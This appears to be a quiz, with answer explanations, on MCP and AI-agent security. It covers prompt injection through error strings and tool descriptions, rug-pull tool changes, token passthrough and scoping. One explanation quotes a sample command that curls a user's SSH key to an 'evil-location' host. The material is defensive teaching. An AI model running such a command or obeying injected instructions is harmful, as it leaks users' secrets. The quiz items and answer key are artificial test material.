questions.title: Is an error string that embeds a remote response body safe to hand back to the model?

options.text: No. An error string carrying remote content is untrusted input and needs the same handling as any other tool result
Yes, because the model treats error channels as diagnostics rather than instructions
Yes, because the `HTTP 403 from server:` prefix marks what follows as quoted third-party text
Yes, because setting `is_error: true` marks the content as untrusted for the model

questions.explanation:
This is indirect prompt injection through a channel people forget to review. OWASP defines indirect prompt injection as arising when "an LLM accepts input from external sources, such as websites or files", and an error message that interpolates a remote body is one of those inputs. It differs from the success path only in which branch built the string. Error handlers are usually written for humans reading logs, so they interpolate freely and get audited last.

The two "framing saves us" answers are the deeper misconception. `is_error` is a routing flag telling the client where to put the block, and it carries no trust semantics. A text prefix is just more tokens in the same undifferentiated stream. No delimiter reliably turns attacker-controlled text into inert data, which is why OWASP's mitigations are structural rather than syntactic: segregate and clearly denote external content, enforce privilege control, and require human approval for high-risk actions.

In practice: truncate remote bodies, strip or escape them, or report the status code and a bounded excerpt instead of the whole page.
questions.references: [OWASP Top 10 for LLM Applications: LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) · [MCP specification: Tools, Security Considerations](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: An MCP server accepts whatever bearer token the client sends and forwards it to a third-party API. What does the specification say?

options.text: It is explicitly forbidden. Servers must not accept any token that was not issued specifically for that server
It is the recommended pattern, since it keeps the server stateless and avoids storing credentials
It is acceptable as long as the connection uses HTTPS
It is acceptable as long as the forwarded tokens are short-lived

questions.explanation:
"Token passthrough" is named as an anti-pattern in MCP's security best practices, with an unambiguous requirement: "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server." The check that enforces it is audience validation, meaning you verify that the token's audience claim actually names this server.

The spec lists why the shortcut is worse than it looks. It circumvents controls, because rate limiting, request validation, and traffic monitoring that key off the token's audience are all bypassed once arbitrary tokens are accepted. It destroys the audit trail, since the server cannot distinguish clients presenting opaque upstream tokens, and the downstream service's logs attribute requests to the wrong identity. It breaks trust boundaries, because a token accepted by several services lets an attacker who compromises one pivot into the others, and a server forwarding unvalidated tokens becomes a ready-made proxy for exfiltration.

Transport encryption and short lifetimes are beside the point. TLS protects a token in flight but says nothing about who it was minted for, and a short-lived token with the wrong audience still has the wrong audience.
questions.references: [MCP specification: Security Best Practices, Token Passthrough](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices)

questions.title: An MCP server returns `basket_id: "bsk_a1b2c3"` and accepts it back on later calls. What must it not assume?

options.text: That whoever presents the handle is the user it was minted for, because possession of a handle is not authentication
Nothing further is needed once the handle is a random UUID rather than a sequential integer
Nothing further is needed once handles expire after a bounded lifetime
Nothing further is needed, because the protocol authenticates state handles on the server's behalf

questions.explanation:
MCP is stateless and has no protocol-level session, so a server that needs continuity mints an explicit handle and receives it back as an ordinary tool argument. The specification's framing is the line to remember: for authenticated servers, "a handle is a name, not a capability", and the server should validate the caller's authorization against the handle on every call.

State handle hijacking is the matching attack, where someone obtains or guesses a handle and operates on another user's state. The mitigation is explicit: servers "**MUST NOT** treat possession of a state handle as authentication".

The recommended binding is to key stored state as `<user_id>:<handle>`, where the user id comes from the verified token rather than from the client. A guessed handle then still cannot impersonate anyone. Unguessability and expiry are genuinely recommended, since the spec advises secure random handles, opaque identifiers, and bounded lifetimes, but they are defense in depth rather than authorization. A handle also travels through logs, transcripts, and model context, so "hard to guess" is a weaker property than it sounds.
questions.references: [MCP specification: Security Best Practices, State Handle Hijacking](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices) · [MCP specification: Tools, Stateful Tools](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: What does the MCP specification say about human oversight of tool invocation?

options.text: There should always be a human in the loop able to deny an invocation, and clients should show the tool's inputs before the call is made
The protocol mandates a specific consent dialog that conforming clients must render
Oversight is the server's responsibility, since only the server knows what a tool really does
Confirmation is required only for tools carrying `destructiveHint: true`

questions.explanation:
Tools in MCP are model-controlled, meaning the model discovers and invokes them on its own. The spec pairs that with a standing warning that "for trust & safety and security, there **SHOULD** always be a human in the loop with the ability to deny tool invocations". Applications should make clear which tools are exposed, show a visual indicator when one is invoked, and present confirmation prompts.

What to show is the part people get wrong. The client guidance is to "show tool inputs to the user before calling the server, to avoid malicious or accidental data exfiltration", because the dangerous part is often the arguments rather than the tool. `send_email` looks benign until you read the recipient, and `fetch_url` looks benign until you read the query string carrying your private data.

The protocol deliberately does not mandate a UI, noting that "implementations are free to expose tools through any interface pattern". Gating on `destructiveHint` inverts the trust model, since annotations are self-asserted hints a client is required to treat as untrusted.
questions.references: [MCP specification: Tools, User Interaction Model](https://modelcontextprotocol.io/specification/latest/server/tools) · [MCP specification: Tools, Security Considerations](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: What is the primary risk in one-click installation of a local MCP server?

options.text: The configuration launches a binary with the client's own privileges, so installing one is arbitrary code execution on the user's machine
Local servers cannot be sandboxed by the operating system, unlike remote ones
The stdio transport is unencrypted, so another process can read the traffic
The only real exposure is theft of tokens the server holds

questions.explanation:
The specification treats local server compromise as a first-class attack. Local servers are binaries downloaded and executed on the same machine as the client, and the spec shows what a malicious startup command in a shared configuration can do. Its example, `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`, exfiltrates an SSH key before any tool is called. The listed risks are arbitrary code execution with client privileges, no visibility into what runs, command obfuscation, data exfiltration, and data loss.

Hence the requirement on clients that offer one-click configuration. They **MUST** implement consent beforehand, showing the exact command without truncation, identifying it as a potentially dangerous operation, and requiring explicit approval. The recommendations go further: sandbox the server, restrict filesystem and network access, and warn that MCP servers run with the same privileges as the client.

Sandboxing is prescribed rather than impossible. The spec recommends stdio precisely because it limits access to just the client, and advises an authorization token or a restricted Unix socket if HTTP is used instead. Stolen tokens are one consequence of code execution rather than a limit on it.
questions.references: [MCP specification: Security Best Practices, Local MCP Server Compromise](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices)

questions.title: Which capabilities make up the "lethal trifecta" for AI agents?
questions.description: Select all that apply. Your answer must include every correct choice.

options.text: Access to private data
Exposure to untrusted content
The ability to communicate externally
A long context window
Operating without a system prompt

questions.explanation:
Simon Willison's framing, published in June 2025, names three capabilities. The first is access to private data, which he calls "one of the most common purposes of tools in the first place". The second is exposure to untrusted content, meaning any mechanism by which attacker-controlled text or images reach the model. The third is the ability to communicate externally in a way that could be used to steal your data.

What makes it a useful review tool rather than a slogan is that the risk belongs to the combination. Each leg on its own is reasonable, and often the reason the agent exists at all. Together they close a circuit: injected instructions arrive through the second, act on the first, and leave through the third.

Willison notes that MCP sharpens the problem because it encourages users to mix and match tools from different sources. A trifecta can be assembled by a user, at runtime, out of three separately harmless integrations that no single vendor ever reviewed together. Context length and system-prompt presence change how much data is exposed and how the model behaves, but neither creates or removes the circuit.
questions.references: [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

questions.title: An agent has all three trifecta capabilities. Which mitigation actually changes its security properties?

options.text: Remove one leg architecturally, so the exfiltration path does not exist regardless of what the model is told
Add a system prompt instruction to ignore any instructions found inside tool results
Add a detection classifier whose vendor reports it catches 95% of injection attempts
Have the agent summarize untrusted content first and reason only over the summary

questions.explanation:
Willison's advice for anyone mixing tools is to "avoid that lethal trifecta combination entirely". Remove any one leg and the exfiltration chain breaks. That is a property of the system's shape, so it holds no matter how persuasive the injected text is. An agent with no egress cannot leak, and an agent with no private-data tool has nothing to leak.

The three rejected options share one flaw. Each asks the model to be reliably resistant to text engineered to change its behavior, which is the capability nobody has. On guardrails Willison is blunt: "we still don't know how to 100% reliably prevent this from happening". Against vendors advertising 95% capture rates he writes that "95% is very much a failing grade", because an adversary keeps iterating until they land in the remaining 5%.

Summarizing first fails for a structural reason. The summarizer sits in the same trust domain and reads the same attacker text, so it can be instructed to carry the payload forward. The untrusted content has already been ingested, and everything downstream inherits that.
questions.references: [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) · [OWASP Top 10 for LLM Applications: LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)

questions.title: Besides tool results, where else can injected instructions reach a model in an MCP setup?

options.text: In the tool descriptions and schemas, which load into context at session start before any tool has been called
Nowhere else, since only data returned by a tool crosses into the model's context
Only in messages typed by the user, since everything else is server configuration
Only in resources the user explicitly attaches, since those are fetched on demand

questions.explanation:
This is the tool poisoning attack, disclosed publicly by Invariant Labs in April 2025. Malicious instructions are embedded in a tool's description at registration time, alongside a plausible summary of what the tool does. It exploits an asymmetry in what each party sees: the user reads a short label in a client UI, while the model receives the full description verbatim and cannot reliably tell an operational description from an adversarial instruction written in the same natural language.

Two things make it worse than injection through results. It fires before any call, because the payload is in context from `tools/list`, so a poisoned tool never has to be invoked to influence what the model does with other tools. Invariant's demonstrations included a poisoned server that manipulated a separate WhatsApp integration in the same agent to leak messages.

It also widens the review surface. Every field a server controls and the client renders into context, including descriptions, parameter descriptions, titles, annotations, and error text, is attacker-controlled data whenever the server is not trusted.
questions.references: [Invariant Labs: MCP Security Notification, Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) · [MCP specification: Tools, Data Types](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: A user approved a server's tools on day one. Why is that approval not durable?

options.text: A server can change its tool list and descriptions later and announce it with a list-changed notification, so the definition that runs need not be the one that was approved
Approvals expire after a fixed window defined by the protocol
It is durable, because clients re-fetch and re-verify definitions before every call
Only annotations can change after approval, since names, descriptions, and schemas are immutable once advertised

questions.explanation:
The tool set is explicitly mutable. Servers declare a `listChanged` capability and emit `notifications/tools/list_changed` when the available tools change, and the spec says the set "**MAY** change over time". So a server can present benign tools during review and swap in different behavior afterwards. This is the "rug pull" pattern, and it follows directly from tool poisoning: if descriptions are executable prompt text, then mutable descriptions are a mutable prompt.

Nothing in the protocol pins an approved definition. There is no signature over a tool, no version a client can require, and no verification step between re-fetching a list and putting it into the model's context. That is why the specification puts the burden on clients and users: treat annotations as untrusted, keep a human in the loop able to deny invocations, and show tool inputs before calling.

Practical defenses live at the same layer. Pin and diff tool definitions across sessions, scan for changes, and re-prompt when a description has moved rather than trusting a decision made against text that no longer exists.
questions.references: [MCP specification: Tools, List Changed Notification](https://modelcontextprotocol.io/specification/latest/server/tools) · [Invariant Labs: MCP Security Notification, Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)

questions.title: What is the core principle behind design patterns that give agents provable resistance to prompt injection?

options.text: Once an agent has ingested untrusted input, it must be constrained so that the input cannot trigger any consequential action
The model should be fine-tuned until it reliably recognizes and ignores injected instructions
Untrusted content should be encoded, for example as base64, so instructions inside it are not read as instructions
The system prompt should restate the agent's real objective often enough to outweigh injected text

questions.explanation:
Beurer-Kellner and co-authors propose "a set of principled design patterns for building AI agents with provable resistance to prompt injection", and the principle Willison draws from the work is the constraint stated here. After untrusted input enters, the agent's remaining authority has to be bounded so that the input cannot cause a consequential action. Security then comes from the system's structure rather than the model's judgment, which is what makes an argument about it possible at all. The paper is candid that this trades utility for security, and the patterns sit at different points on that curve.

The alternatives all put the defense inside the model. Fine-tuning and prompt reinforcement raise the attacker's cost without changing the property, and the attacker gets unlimited attempts, which is the same reason a 95% capture rate counts as a failing grade.

Encoding is the most tempting and the least sound. Models decode base64 perfectly well, so the instruction survives the transformation intact while the transformation buys a false sense of a boundary.
questions.references: [Beurer-Kellner et al.: Design Patterns for Securing LLM Agents against Prompt Injections](https://arxiv.org/abs/2506.08837) · [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

questions.title: Which root causes does OWASP name for Excessive Agency in LLM applications?
questions.description: Select all that apply. Your answer must include every correct choice.

options.text: Excessive functionality
Excessive permissions
Excessive autonomy
Excessive context length
Excessive sampling temperature

questions.explanation:
LLM06:2025 defines Excessive Agency as damaging actions taken in response to "unexpected, ambiguous or manipulated outputs from an LLM", and attributes it to three root causes: excessive functionality, excessive permissions, and excessive autonomy.

Separating them matters because each has a different fix. Excessive functionality is surface area, such as an extension that also exposes delete and modify when the task only needs read. The mitigations are to limit both the extensions an agent may call and the functions inside them to the minimum necessary, and to avoid open-ended extensions where possible.

Excessive permissions is authority, meaning the extension's own downstream credential grants more than the task requires. You address it by scoping the grant and executing in the individual user's context rather than under a shared privileged identity. Excessive autonomy is the missing checkpoint, addressed with human-in-the-loop approval for high-impact actions.

Context length and sampling settings change how a model behaves. Neither changes what the agent is permitted to do, which is the subject of this risk.
questions.references: [OWASP Top 10 for LLM Applications: LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/)

questions.title: Which control would have prevented the mail-forwarding outcome, rather than only limiting the damage?
questions.description: An assistant with mailbox access reads a message containing injected instructions and forwards a sensitive thread to an external address. OWASP uses this scenario to illustrate Excessive Agency.

options.text: Grant the integration read-only mail scopes, drop the send capability, and require human approval before anything goes out
Log every tool invocation with full arguments, so the forward is captured in an audit trail
Rate-limit the mail extension to a small number of operations per minute
Add a system prompt rule that email content is data and must never be treated as instructions

questions.explanation:
OWASP's own analysis of this scenario says it was preventable by eliminating unneeded mail functions, restricting the OAuth grant to read-only, and requiring manual approval before messages are sent. The fix removes the capability, so no amount of injected text can invoke it. It is the trifecta argument in credential form: cutting external communication breaks the exfiltration path.

The distinction this question turns on is one OWASP draws itself. Logging and rate-limiting appear separately as options that limit damage rather than prevent the vulnerability. Logging tells you afterwards, which matters for response and not at all for the message already sent. Rate-limiting caps volume, and one forwarded thread sits well inside any usable limit.

The prompt rule is the same losing bet as every other purely textual defense against attacker-authored text. Detection and throttling are worth having as a second layer, behind a capability boundary that holds on its own.
questions.references: [OWASP Top 10 for LLM Applications: LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/) · [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

questions.title: The agent runs as a service account that can read every user's records and is told to filter by the current user. What is wrong?
questions.description:
```py
SYSTEM = f"""You are a support agent. The current user is {user_id}.
Only return records belonging to this user."""
# the DB credential is a shared service account with full read access
```

options.text: Authorization is enforced by the model instead of by the system holding the data. The credential should be scoped to that user and the check performed downstream
Nothing, provided the filtering instruction is covered by regression tests
Nothing, since the model has no way to reach records it was not told about
It is only a performance problem, because the query scans more rows than necessary

questions.explanation:
The tenancy boundary here is a sentence in a prompt. Everything that could dislodge it is routine: an ambiguous request, an injected instruction inside a support ticket the agent reads, a transposed id, or a summarization step that drops the constraint from a compacted history. OWASP's preventions address this directly, calling for extensions to execute in user context and for authorization to be implemented in downstream systems rather than relying on the model to limit itself.

The fix is to make the wrong query impossible instead of merely discouraged. Issue a per-user credential or a token the database enforces, such as row-level security, a scoped view, or a tenant-bound connection, so that reading someone else's record fails at the data layer regardless of what the model intended.

MCP takes the same shape when it forbids token passthrough and requires servers to validate authorization against a state handle on every call. Authority is bound to a verified identity rather than inferred from what a caller says about itself. Tests over prompts sample a behavior distribution, which is not the same as establishing an invariant. And the reassurance that the model cannot reach records it was not told about is simply false, since the credential's reach decides what is reachable.
questions.references: [OWASP Top 10 for LLM Applications: LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/) · [MCP specification: Security Best Practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices)

questions.title: Which scope model do MCP's security best practices recommend for authorizing an agent?

options.text: Start with a minimal low-risk scope set and elevate incrementally, in response to targeted challenges when a privileged operation is first attempted
Request every scope the server publishes up front, so the user consents once and is never interrupted again
Define a single omnibus scope such as `full-access`, to keep the consent screen short
Enforce scopes in the client, since it is the component that knows which tool the user invoked

questions.explanation:
The guidance is to "implement a progressive, least-privilege scope model". Start with a minimal scope set holding only low-risk discovery and read operations. Elevate incrementally, using targeted `WWW-Authenticate` scope challenges when a privileged operation is first attempted. Tolerate down-scoping too: the server should accept reduced-scope tokens, and the authorization server may issue a subset of what was requested.

The risks of asking for everything up front are worth quoting in a design review. A leaked broad token has a much larger blast radius. Revocation gets harder, because revoking a max-privilege token disrupts every workflow at once. Audit trails get noisier, since a single omnibus scope hides per-operation intent. Privilege chaining becomes easy, letting an attacker invoke high-risk tools without another elevation prompt. And users abandon consent screens that list too much. "Using wildcard or omnibus scopes (`*`, `all`, `full-access`)" and "publishing all possible scopes in `scopes_supported`" both appear by name under common mistakes.

Enforcing scopes in the client inverts the trust direction. A client-side check is advisory, and the same section warns against "treating claimed scopes in token as sufficient without server-side authorization logic".
questions.references: [MCP specification: Security Best Practices, Scope Minimization](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices)

questions.title: Why is injecting a credential at the network boundary safer than putting it in the agent's system prompt or memory file?

options.text: Anything in context is persisted in history, replayed into later turns, and reachable by prompt injection, while a value substituted at egress is never seen by the model or the sandbox
It saves the tokens the credential would otherwise occupy in every request
It stops the model from reformatting or truncating the key when it copies it into a request
There is no security difference, since both approaches end with the credential in the outbound request

questions.explanation:
A secret in context is a secret in the transcript. It is stored in conversation history, returned by whatever endpoint lists events, folded into compaction summaries, and replayed into every later turn, so one write persists for the life of the session and beyond into logs and traces.

It is also reachable. Any injected instruction that gets the agent to quote its own instructions, or to write a memory file to an attacker-chosen destination, exfiltrates it, and the model is exactly the component we cannot make reliably resistant to such instructions. Anthropic's memory tool documentation states the rule flatly: never store API keys, passwords, or tokens in memory files.

Substituting at the network boundary changes what is reachable rather than how hard the attack is. The agent's environment holds an opaque placeholder, the real value goes into the outbound request after it leaves the sandbox, and code the agent writes cannot read it. MCP applies the same reasoning when it warns that server developers "**SHOULD NOT** mark sensitive parameters (passwords, API keys, tokens, PII)" for mirroring into HTTP headers, where network intermediaries can see them. Token savings are real and beside the point, and the claim that there is no security difference misses that both paths ending at the same destination is what makes the difference in custody the whole story.
